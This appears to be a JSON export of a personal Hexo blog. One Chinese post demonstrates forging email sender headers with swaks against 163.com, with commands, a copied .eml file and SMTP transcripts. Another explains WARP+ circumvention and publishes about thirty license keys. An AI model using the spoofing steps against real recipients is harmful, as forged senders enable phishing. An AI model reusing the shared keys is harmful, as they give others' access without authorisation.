volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>网络的安全是360度向外发射的，邮件的方向也是可以被利用的漏洞。今天新学的一个技能，可以自己给自己发邮件，目前只在163邮箱进行了实验，先把今天的小成果记录下来，后续有发现再做更新。</p>\n<p>如果有kali直接利用kali就OK，有一个工具叫swaks.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --to river_li@whu.edu.cn</span><br></pre></td></tr></table></figure>\n\n<p>这里只指定了收件人，目的是测试发送的连通性，可以当成一个测试。</p>","more":"<p>swaks 有常用的几个选项   </p>\n<ul>\n<li>–to</li>\n<li>–from</li>\n<li>–h-To</li>\n<li>–h-From</li>\n</ul>\n<p>直接在命令行中指定的–from实际上是SMTP协议中的MailFrom字段，即信封上的From</p>\n<p>使用–h-From指定的内容是信件内容中头部的From字段，即信件内容上，收件人看到的From</p>\n<p>–to和–h-To同理</p>\n<ul>\n<li>–server —要登录的服务器</li>\n<li>–ehlo   —要验证hello的服务器</li>\n<li>-au    —在这个服务器上的用户名</li>\n<li>-ap    —对应的用户密码</li>\n</ul>\n<p>swaks还可以登录登录其他的邮箱来发送邮件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --server smtp.163.com --au lizic0228@163.com --ap XXXXXXXXX --ehlo smtp.163.com --from lizic0228@163.com --to river_li@whu.edu.cn</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --to m19527705687@163.com --from m19527705687@163.com --body <span class=\"string\">&#x27;This is a test mailing&#x27;</span> --header <span class=\"string\">&#x27;Subject: test&#x27;</span> --ehlo gmail.com --header-X-Mailer gmail.com</span><br></pre></td></tr></table></figure>\n\n<p>这个命令的to和from都是一样的参数，很明显是执行不成功的。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=== Trying 163mx01.mxmail.netease.com:25...</span><br><span class=\"line\">=== Connected to 163mx01.mxmail.netease.com.</span><br><span class=\"line\">&lt;-  220 163.com Anti-spam GT <span class=\"keyword\">for</span> Coremail System (163com[20141201])</span><br><span class=\"line\"> -&gt; EHLO gmail.com</span><br><span class=\"line\">&lt;-  250-mail</span><br><span class=\"line\">&lt;-  250-PIPELINING</span><br><span class=\"line\">&lt;-  250-AUTH LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-AUTH=LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur84UJgUCa0xDrUUUUj</span><br><span class=\"line\">&lt;-  250-STARTTLS</span><br><span class=\"line\">&lt;-  250-SIZE 73400320</span><br><span class=\"line\">&lt;-  250 8BITMIME</span><br><span class=\"line\"> -&gt; MAIL FROM:&lt;m19527700560@163.com&gt;</span><br><span class=\"line\">&lt;** 553 Local user is not allowed,163 zwqz-mx-mta-g4-3,_____wCnFa7_NixkB9IdAA--.15197S2 1680619263</span><br><span class=\"line\"> -&gt; QUIT</span><br><span class=\"line\">&lt;-  221 Bye</span><br><span class=\"line\">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>\n\n<p>发生了553的错误。</p>\n<p>单纯地使用命令的行的方式，总是会出现一些奇奇怪怪的错误，至今还没研究明白是怎么一回事。应该是可以使用的，等待后续更新吧。</p>\n<hr>\n<p>更加复杂的功能可以通过指定数据实现，也是我唯一执行成功的方法。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --to river_li@whu.edu.cn --data data.eml</span><br></pre></td></tr></table></figure>\n\n<p>指定的data内容就是一封邮件的内容，可以指定From、Subject、Content-Type、DKIM-Signature等字段。<br>可以把下面这一段代码，写进一个文件，命名为data.eml 在执行命令时进行引用。然后文件里的–to选项和–from选项即使相同也并不发生冲突，命令里的–to选项正常写。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Delivered-To: yixianosaurusphangnga7096@gmail.com</span><br><span class=\"line\">Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP <span class=\"built_in\">id</span> c26csp2268818ivo;</span><br><span class=\"line\">        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\">X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW</span><br><span class=\"line\">X-Received: by 2002:a63:6d0b:: with SMTP <span class=\"built_in\">id</span> i11mr2776601pgc.404.1585553581825;</span><br><span class=\"line\">        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\">ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;</span><br><span class=\"line\">        d=google.com; s=arc-20160816;</span><br><span class=\"line\">        b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi</span><br><span class=\"line\">         QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR</span><br><span class=\"line\">         b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc</span><br><span class=\"line\">         GyjA==</span><br><span class=\"line\">ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;</span><br><span class=\"line\">        h=subject:from:to:<span class=\"built_in\">date</span>:message-id;</span><br><span class=\"line\">        bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;</span><br><span class=\"line\">        b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu</span><br><span class=\"line\">         kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+</span><br><span class=\"line\">         m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK</span><br><span class=\"line\">         Kuvw==</span><br><span class=\"line\">ARC-Authentication-Results: i=1; mx.google.com;</span><br><span class=\"line\">       spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\">Return-Path: &lt;admin@saucer-man.com&gt;</span><br><span class=\"line\">Received: from saucer-man.com ([003.11.50.2])</span><br><span class=\"line\">        by mx.google.com with ESMTP <span class=\"built_in\">id</span> m6si9771129pld.54.2020.03.30.00.33.01</span><br><span class=\"line\">        <span class=\"keyword\">for</span> &lt;yixianosaurusphaaaga7096@gmail.com&gt;;</span><br><span class=\"line\">        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\">Received-SPF: temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;</span><br><span class=\"line\">Authentication-Results: mx.google.com;</span><br><span class=\"line\">       spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\">Message-ID: &lt;5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com&gt;</span><br><span class=\"line\">Date: Mon, 30 Mar 2020 15:32:58 +0800</span><br><span class=\"line\">To: yixianosaurusphaaaga7096@gmail.com</span><br><span class=\"line\">From: admin@saucer-man.com</span><br><span class=\"line\">Subject: <span class=\"built_in\">test</span> mail</span><br><span class=\"line\">X-Mailer: saucer-man.com</span><br><span class=\"line\"></span><br><span class=\"line\">这里是信件的正文内容，可以进行修改。</span><br><span class=\"line\">```    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## PS：</span></span><br><span class=\"line\"></span><br><span class=\"line\">***Date: Mon, 30 Mar 2020 15:32:58 +0800***</span><br><span class=\"line\"></span><br><span class=\"line\">***To: yixianosaurusphaaaga7096@gmail.com***</span><br><span class=\"line\"></span><br><span class=\"line\">***From: admin@saucer-man.com***</span><br><span class=\"line\"></span><br><span class=\"line\">***Subject: <span class=\"built_in\">test</span> mail***</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Date —可以修改邮件的时间戳</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; To —可以修改邮件的收件人</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; From —修改邮件的发件人</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Subject —修改邮件的主题</span><br><span class=\"line\"></span><br><span class=\"line\">一般修改这几项就OK了</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 成功的案例</span></span><br><span class=\"line\"></span><br><span class=\"line\">```bash 折叠代码</span><br><span class=\"line\">swaks --to worktestnet321@163.com --data /data.eml </span><br></pre></td></tr></table></figure>\n\n<p>我把文件写在了根目录下data.eml文件中，命令里的–to 是我要发送的邮件地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*** DEPRECATION WARNING: Inferring a filename from the argument to --data will be removed <span class=\"keyword\">in</span> the future.  Prefix filenames with <span class=\"string\">&#x27;@&#x27;</span> instead.</span><br><span class=\"line\">=== Trying 163mx03.mxmail.netease.com:25...</span><br><span class=\"line\">=== Connected to 163mx03.mxmail.netease.com.</span><br><span class=\"line\">&lt;-  220 163.com Anti-spam GT <span class=\"keyword\">for</span> Coremail System (163com[20141201])</span><br><span class=\"line\"> -&gt; EHLO knight</span><br><span class=\"line\">&lt;-  250-mail</span><br><span class=\"line\">&lt;-  250-PIPELINING</span><br><span class=\"line\">&lt;-  250-AUTH LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-AUTH=LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFod1muUCa0xDrUUUUj</span><br><span class=\"line\">&lt;-  250-STARTTLS</span><br><span class=\"line\">&lt;-  250-SIZE 73400320</span><br><span class=\"line\">&lt;-  250 8BITMIME</span><br><span class=\"line\"> -&gt; MAIL FROM:&lt;knight@knight&gt;</span><br><span class=\"line\">&lt;-  250 Mail OK</span><br><span class=\"line\"> -&gt; RCPT TO:&lt;m19527700560@163.com&gt;</span><br><span class=\"line\">&lt;-  250 Mail OK</span><br><span class=\"line\"> -&gt; DATA</span><br><span class=\"line\">&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class=\"line\"> -&gt; Delivered-To: yixianosaurusphangnga7096@gmail.com</span><br><span class=\"line\"> -&gt; Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP <span class=\"built_in\">id</span> c26csp2268818ivo;</span><br><span class=\"line\"> -&gt;         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\"> -&gt; X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW</span><br><span class=\"line\"> -&gt; X-Received: by 2002:a63:6d0b:: with SMTP <span class=\"built_in\">id</span> i11mr2776601pgc.404.1585553581825;</span><br><span class=\"line\"> -&gt;         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\"> -&gt; ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;</span><br><span class=\"line\"> -&gt;         d=google.com; s=arc-20160816;</span><br><span class=\"line\"> -&gt;         b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi</span><br><span class=\"line\"> -&gt;          QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR</span><br><span class=\"line\"> -&gt;          b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc</span><br><span class=\"line\"> -&gt;          GyjA==</span><br><span class=\"line\"> -&gt; ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;</span><br><span class=\"line\"> -&gt;         h=subject:from:to:<span class=\"built_in\">date</span>:message-id;</span><br><span class=\"line\"> -&gt;         bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;</span><br><span class=\"line\"> -&gt;         b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu</span><br><span class=\"line\"> -&gt;          kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+</span><br><span class=\"line\"> -&gt;          m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK</span><br><span class=\"line\"> -&gt;          Kuvw==</span><br><span class=\"line\"> -&gt; ARC-Authentication-Results: i=1; mx.google.com;</span><br><span class=\"line\"> -&gt;        spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\"> -&gt; Return-Path: &lt;admin@saucer-man.com&gt;</span><br><span class=\"line\"> -&gt; Received: from saucer-man.com ([003.11.50.2])</span><br><span class=\"line\"> -&gt;         by mx.google.com with ESMTP <span class=\"built_in\">id</span> m6si9771129pld.54.2020.03.30.00.33.01</span><br><span class=\"line\"> -&gt;         <span class=\"keyword\">for</span> &lt;yixianosaurusphaaaga7096@gmail.com&gt;;</span><br><span class=\"line\"> -&gt;         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\"> -&gt; Received-SPF: temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;</span><br><span class=\"line\"> -&gt; Authentication-Results: mx.google.com;</span><br><span class=\"line\"> -&gt;        spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\"> -&gt; Message-ID: &lt;5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com&gt;</span><br><span class=\"line\"> -&gt; Date: Mon, 30 Mar 2020 15:32:58 +0800</span><br><span class=\"line\"> -&gt; To: worktestnet321@163.com</span><br><span class=\"line\"> -&gt; From: worktestnet321@163.com</span><br><span class=\"line\"> -&gt; Subject: <span class=\"built_in\">test</span> mail</span><br><span class=\"line\"> -&gt; X-Mailer: saucer-man.com</span><br><span class=\"line\"> -&gt; </span><br><span class=\"line\"> -&gt; 4008208820 DNC 橡果国际 新购物 新生活</span><br><span class=\"line\"> -&gt; </span><br><span class=\"line\"> -&gt; .</span><br><span class=\"line\">&lt;-  250 Mail OK queued as zwqz-mx-mta-g9-1,_____wBHQvQpOyxkxthYAA--.22943S2 1680620329</span><br><span class=\"line\"> -&gt; QUIT</span><br><span class=\"line\">&lt;-  221 Bye</span><br><span class=\"line\">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>\n\n<p>出现250的状态码发送成功，</p>"},{"title":"科学上网的终极解决方案","date":"2023-07-25T12:22:51.000Z","_content":"\n从我有了第一台电脑后，science online的手段也逐渐见证着我的成长，从最初的浏览器插件上网，到SSR的小飞机，再到V2ray，以及后面陪伴我最久的clash。可以说已经是身经百战的老油条了。到今天我又遇到了一个具有里程碑式的science online手段**CloudFlare+Warp+ 优选IP**。\n\nCloudFlare拥有极高的业界权威，拥有顶尖的技术团队，拥有最安全的网络方案，他们公司的推出的science online技术那是无形中代表了一个技术标准的。在我实际体验下来，效果确实非常好，很舒服。\n\n<!-- more -->\n\n### 环境准备\n\n虽说是教程，但可不是从0开始的教程。\n\n* 需要拥有telegram账号和客户端，客户端可以是安卓、windows、Mac、iOS、Linux。\n\n* [telegram官网](https://telegram.org/)\n\n### 获取Warp+的永久免费流量\n\n需要在telegram里搜索一个机器人，机器人叫“warp+ bot”，但是我试了一下，直接搜是搜不出来的，后来发现可以通过链接直接找到他，[链接地址](https://t.me/generatewarpplusbot)\n\n![telegram](./science-network/1.jpg)\n\n* 找到这个机器人之后，发送指令`/generate`\n\n* 然后他会让你关注两个类似公众号的东西，就是图中的`Warp Plus`和`akame.moe enjoyers`直接按他的意思进行关注\n\n* 再次发送`/generate` 然后他会进行真人验证，给你出一道一位数相加的数学题\n\n* 按照他的题，把答案写在命令之后，比如图中的`/generate 8`，然后就可以拿到一个秘钥，把这个秘钥留好，待会要用到。（其实不留好也没关系，丢了可以再申领一个，而且每个秘钥含的流量已经超过2EB了，所以说根本用不完，就差把永久免费写在脑门上了）\n\n我也向大家提供几个可以直接使用的秘钥：\n\n```bash 折叠代码\n🔐 Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)\n🔐 Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)\n🔐 Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)\n🔐 Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)\n🔐 Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)\n🔐 Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)\n🔐 Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)\n🔐 Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)\n🔐 Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)\n🔐 Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 GB)\n🔐 Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)\n🔐 Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)\n🔐 Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)\n🔐 Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)\n🔐 Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)\n🔐 Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)\n🔐 Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)\n🔐 Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)\n🔐 Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)\n🔐 Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)\n🔐 Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)\n🔐 Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)\n🔐 Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)\n🔐 Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)\n🔐 Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)\n🔐 Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)\n🔐 Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)\n🔐 Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)\n🔐 Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)\n🔐 Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)\n```\n\n### 下载代理工具\n\n这次需要的代理工具是wireguard，[官方下载链接](https://www.wireguard.com/install/)\n\n[备用下载地址](https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha)\n提取码：trha\n\n下载完直接安装就OK。\n\n这是软件的截图。\n\n![wireguard软件截图](./science-network/2.png)\n\n新用户没有配置是不会有配置信息的\n\n* 首先左下角找到这个下拉框，点击新建空隧道\n\n* 会让你起一个名字，随便起一个名字就好\n\n* 公钥的部分不要动\n\n* 再往下的文本块是配置信息，然后把画面停在这里，最小化，我们去生成配置信息\n\n### 生成配置信息\n\n利用一个在线的工具生成配置信息，[工具链接地址](https://replit.com/@misaka-blog/wgcf-profile-generator?v=1)\n\n![网站截图](./science-network/3.png)\n\n进入网站后，点击右上角的Run，稍等片刻\n\n![开始配置](./science-network/4.png)\n\n出现这个画面后，因为我们使用的是秘钥，对应的选项是2，输入2后回车。\n\n![开始配置](./science-network/5.png)\n\n这里让输入秘钥，就是之前在telegram获取的秘钥，粘贴在这里后回车。\n\n之后会要求输入一个随机设备名，随便输入一个字符串回车就好。\n\n![开始配置](./science-network/6.png)\n\n生成的红色部分就是配置信息，把配置信息复制下来，然后粘贴在wireguard的文本块里，就像这样。\n\n![开始配置](./science-network/7.png)\n\n最后保存配置信息。\n\n大多数情况下是没有办法直接使用的，因为现在拿到的IP并不是最优IP，所以需要另一个工具来帮助筛选最优的IP，需要注意的是，如果目前有在使用任何的代理或者science online工具必须要停下来，不然会极度影响最优IP的筛选。\n\n### 筛选最优IP\n\n[工具下载链接](https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z)\n\n[备用下载链接](https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f)\n提取码：je5f\n\n这个工具是完全免费开源的，可以放心使用。\n\n下载完解压，有一个`warp-yxip.bat`的文件，双击运行\n\n![运行效果](./science-network/8.png)\n\n选择IPV4的筛选，输入1，回车，等待片刻，进程运行完毕后，会在工具的目录下生成一个result的文件使用Excel打开。\n\n![效果如图](./science-network/9.png)\n\n* LOSS 是丢包率\n\n* DELAY 是延迟\n\n默认会把结果按从优到差进行排序，只需要从前面几个抽一个，复制好IP和端口号然后替换掉wireguard配置文件里的最后一项，比如`Endpoint = 162.159.192.160:894`。\n\n补充一点，在wireguard里，如果需要再对配置文件进行更改，可以直接右击配置名称，选择“编辑所选隧道”。\n\n配置到这里，就完成了，可以进行连接，开始science online旅程了。","source":"_posts/science-network.md","raw":"---\ntitle: 科学上网的终极解决方案\ndate: 2023-07-25 20:22:51\ncategories: 小玩意儿\ntags:\n  - 科学上网\n---\n\n从我有了第一台电脑后，science online的手段也逐渐见证着我的成长，从最初的浏览器插件上网，到SSR的小飞机，再到V2ray，以及后面陪伴我最久的clash。可以说已经是身经百战的老油条了。到今天我又遇到了一个具有里程碑式的science online手段**CloudFlare+Warp+ 